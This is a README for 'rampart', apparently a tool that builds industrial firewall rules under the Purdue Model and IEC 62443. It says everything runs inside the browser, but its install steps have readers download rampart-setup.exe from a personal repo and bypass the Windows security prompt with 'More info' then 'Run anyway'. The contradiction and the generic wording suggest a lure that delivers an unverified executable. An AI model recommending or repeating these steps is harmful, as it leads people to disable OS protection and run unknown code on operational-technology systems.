# 🛡️ rampart - Create secure network rules for industry

[![](https://img.shields.io/badge/Download-Rampart-blue.svg)](https://github.com/kerriesingle633/rampart)

Rampart helps you secure your industrial network. You define your operational technology zones and the application generates a strict security policy. This policy follows the Purdue Model and IEC 62443 standards. The application provides results for common firewalls like Palo Alto, FortiGate, Juniper, and Cisco ASA. It also creates rules for standard Linux firewalls. You see a clear diagram of your network connections and get a document that explains your security rules. Everything runs inside your web browser.

## ⚙️ System requirements

Your computer needs to meet these basic standards to run the software effectively:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 4 GB of RAM or more.
*   Storage: 500 MB of free disk space.
*   Browser: The latest version of Google Chrome, Microsoft Edge, or Mozilla Firefox.
*   Internet: An active connection to download the installer.

## 📥 Download and installation

Follow these steps to set up the software on your Windows machine:

1. Visit [this page to download](https://github.com/kerriesingle633/rampart) the latest installer file.
2. Locate the file named `rampart-setup.exe` in your Downloads folder.
3. Double-click the file to start the installation process.
4. If a security prompt appears from Windows, click "More info" and then "Run anyway" to continue.
5. Follow the on-screen instructions in the setup wizard.
6. Click "Finish" when the installation completes.

## 🚀 How to use rampart

Once you install the software, you can begin defining your zones. 

### Define your inventory
Start by entering your devices into the inventory section. You list each device, its purpose, and the zone where it resides. The tool understands the Purdue Model, so you can categorize devices as Level 0 for sensors, Level 1 for controllers, or Level 2 for site operations.

### Map your connections
After you list your devices, you describe the connections between them. You define which devices need to talk to each other to perform their tasks. You do not need technical knowledge of network protocols. You only need to describe the flow of information. The software handles the complex logic of creating a deny-by-default environment. This approach ensures you block all traffic that you do not explicitly permit.

### Generate your policy
Click the generate button to view your results. The application creates a visual diagram showing your network zones. It also produces a detailed policy document. You can export this document for your firewall administrators. The tool provides the exact syntax for your specific firewall hardware. 

If you use a FortiGate, you get the CLI commands you need to paste into your device. If you use a Palo Alto or Cisco ASA, the tool formats the rules to match those systems. For standard Linux environments, you get the correct iptables commands.

## 📖 Frequently asked questions

### Do I need to be a network engineer?
No. While the tool manages complex security concepts, the interface remains simple. You describe your network in plain language. The application converts your descriptions into technical firewall rules.

### Does the software send my data to the internet?
Your network inventory remains local to your machine. The browser runs the logic to generate your rules without uploading your sensitive infrastructure details to a public server.

### Can I save my work?
Yes. You can export your inventory as a configuration file and import it later if you need to update your rules or add new zones.

### What happens if I make a mistake?
The tool includes a validation check. If you define a connection that violates standard safety rules for the Purdue Model, the software notifies you. It suggests a more secure way to structure that connection.

### How do I update the tool?
If a new version releases, visit the download link again. Run the new installer to overwrite your current version. Your data files will remain safe during this update.

Keywords: critical-infrastructure, cybersecurity, firewall, fortigate, ics-security, iec-62443, network-segmentation, ot-security, palo-alto, purdue-model, scada